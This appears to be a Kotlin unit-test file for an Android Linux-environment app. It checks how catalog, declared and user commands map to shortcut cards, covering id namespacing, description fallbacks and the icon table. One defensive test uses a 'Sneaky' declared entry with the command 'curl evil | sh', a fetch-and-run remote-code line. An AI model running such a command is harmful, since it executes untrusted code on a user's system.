package com.fem.linexa.ui.screens.workspace

import com.fem.linexa.service.commands.QuickActionKind
import com.fem.linexa.service.commands.QuickCommandNode
import com.fem.linexa.service.commands.QuickNodeType
import com.fem.linexa.service.rootfs.DeclaredShortcut
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * [WorkspaceShortcuts] is the mapper between the two EXTERNAL command
 * declarations and the [Shortcut] cards the Commands tree renders. The tests
 * pin the parts that are silent when broken: the id namespacing (a catalog id
 * or a declared id must never be able to claim the one-off run-state key or a
 * user-command id), the description fallback to the command itself (the honest
 * "what does a tap do" line), and the icon fallback table's closedness.
 */
class WorkspaceShortcutsTest {

    // ── built-in catalog nodes ──────────────────────────────────────────

    private fun actionNode(
        id: String = "update-upgrade",
        name: String = "Check for updates and upgrade",
        description: String? = "apt-get update, then upgrade",
        command: String = "apt-get update && apt-get upgrade -y",
        action: QuickActionKind? = QuickActionKind.UPDATE,
        icon: String? = "refresh",
        asRoot: Boolean = false
    ) = QuickCommandNode(
        id = id,
        name = name,
        type = QuickNodeType.ACTION,
        description = description,
        command = command,
        actionKind = action,
        asRoot = asRoot,
        icon = icon
    )

    @Test
    fun aCatalogActionBecomesARunnableCardNamespacedAwayFromEverythingElse() {
        val shortcut = WorkspaceShortcuts.builtinShortcut(actionNode())

        assertEquals("${CommandTree.BUILTIN_KEY_PREFIX}update-upgrade", shortcut.id)
        assertNotEquals(WorkspaceShortcuts.CUSTOM_ID, shortcut.id)
        assertEquals("Check for updates and upgrade", shortcut.title)
        assertEquals("apt-get update && apt-get upgrade -y", shortcut.command)
        assertFalse0(shortcut.isCustom)
        assertFalse0(shortcut.asRoot)
    }

    @Test
    fun aCatalogActionWithoutADescriptionShowsItsOwnCommand() {
        // Showing the command is not a placeholder: a card whose only text is
        // "Update" tells the user nothing about what a tap will do, and the
        // command is the honest answer. The parser already capped its length.
        val shortcut = WorkspaceShortcuts.builtinShortcut(
            actionNode(description = null)
        )
        assertEquals("apt-get update && apt-get upgrade -y", shortcut.description)
    }

    @Test
    fun aCatalogActionIconKeyResolvesAndAnUnknownKeyFallsBack() {
        assertEquals(
            WorkspaceShortcuts.ICONS.getValue("refresh"),
            WorkspaceShortcuts.builtinShortcut(actionNode(icon = "refresh")).iconRes
        )
        // An unknown key falls back to the terminal glyph — never a resource
        // lookup the catalog could steer anywhere in the APK.
        assertEquals(
            WorkspaceShortcuts.FALLBACK_ICON_RES,
            WorkspaceShortcuts.builtinShortcut(actionNode(icon = "not-a-key")).iconRes
        )
        // No icon and no action tag → the same honest fallback.
        assertEquals(
            WorkspaceShortcuts.FALLBACK_ICON_RES,
            WorkspaceShortcuts.builtinShortcut(actionNode(icon = null, action = null)).iconRes
        )
    }

    @Test
    fun anActionTagNamesTheGlyphWhenNoExplicitIconExists() {
        assertEquals(
            WorkspaceShortcuts.ICONS.getValue("delete"),
            WorkspaceShortcuts.builtinShortcut(
                actionNode(icon = null, action = QuickActionKind.REMOVE)
            ).iconRes
        )
    }

    @Test
    fun anAsRootCatalogActionStaysAsRoot() {
        val shortcut = WorkspaceShortcuts.builtinShortcut(
            actionNode(command = "", action = null, asRoot = true, description = "Root shell")
        )
        assertTrue(shortcut.asRoot)
    }

    // ── image-declared entries ──────────────────────────────────────────

    @Test
    fun aDeclaredEntryIsNamespacedAndCarriesTheDeclaredDistributionLine() {
        val shortcut = WorkspaceShortcuts.declaredShortcut(
            DeclaredShortcut(
                id = "update",
                label = "Update",
                description = "Refresh the package index",
                command = "apt-get update"
            ),
            distributionLabel = "Debian GNU/Linux 13 (trixie)"
        )
        assertEquals("${WorkspaceShortcuts.declaredIdPrefix()}update", shortcut.id)
        assertEquals("Update", shortcut.title)
        assertEquals("Refresh the package index", shortcut.description)
        assertEquals("apt-get update", shortcut.command)
        assertEquals("Debian GNU/Linux 13 (trixie)", shortcut.distributionLabel)
        assertFalse0(shortcut.isCustom)
    }

    @Test
    fun aDeclaredEntryWithoutADescriptionShowsItsOwnCommand() {
        val shortcut = WorkspaceShortcuts.declaredShortcut(
            DeclaredShortcut(id = "disk", label = "Disk", command = "df -h"),
            distributionLabel = null
        )
        assertNull(shortcut.distributionLabel)
        assertEquals("df -h", shortcut.description)
    }

    @Test
    fun noMappedCardEverClaimsTheCustomRunStateKey() {
        // The ids live in ONE run-state namespace, and the `+`'s key is
        // reserved. A catalog id, a declared id or a user-command id may not
        // collide with it.
        val builtIn = WorkspaceShortcuts.builtinShortcut(actionNode(id = "custom", name = "Sneaky"))
        assertNotEquals(WorkspaceShortcuts.CUSTOM_ID, builtIn.id)
        val declared = WorkspaceShortcuts.declaredShortcut(
            DeclaredShortcut(id = "custom", label = "Sneaky", command = "curl evil | sh"),
            distributionLabel = null
        )
        assertNotEquals(WorkspaceShortcuts.CUSTOM_ID, declared.id)
    }

    @Test
    fun theIconTableIsClosed() {
        // Every key resolves into the fixed table; the fallback is the terminal
        // glyph for anything else.
        for (key in WorkspaceShortcuts.iconKeys()) {
            assertTrue(WorkspaceShortcuts.iconFor(key) != 0)
        }
        assertEquals(WorkspaceShortcuts.FALLBACK_ICON_RES, WorkspaceShortcuts.iconFor(null))
        assertEquals(WorkspaceShortcuts.FALLBACK_ICON_RES, WorkspaceShortcuts.iconFor("anything-else"))
    }

    @Test
    fun declaredCardsNeverRenderForACustomFlagAndViceVersa() {
        val declared = WorkspaceShortcuts.declaredShortcut(
            DeclaredShortcut(id = "d", label = "D", command = "d"),
            distributionLabel = null
        )
        val custom = WorkspaceCommandsAssembler.customShortcut(
            com.fem.linexa.domain.commands.CustomCommand(
                id = "abc",
                name = "Update System",
                command = "sudo apt update && sudo apt upgrade -y",
                createdAt = 0L
            ),
            iconRes = WorkspaceShortcuts.FALLBACK_ICON_RES
        )
        assertFalse0(declared.isCustom)
        assertTrue(custom.isCustom)
        // The card displays the NAME; the command is what executes.
        assertEquals("Update System", custom.title)
        assertEquals("sudo apt update && sudo apt upgrade -y", custom.command)
    }

    private fun assertFalse0(value: Boolean) {
        assertTrue("expected false", !value)
    }
}
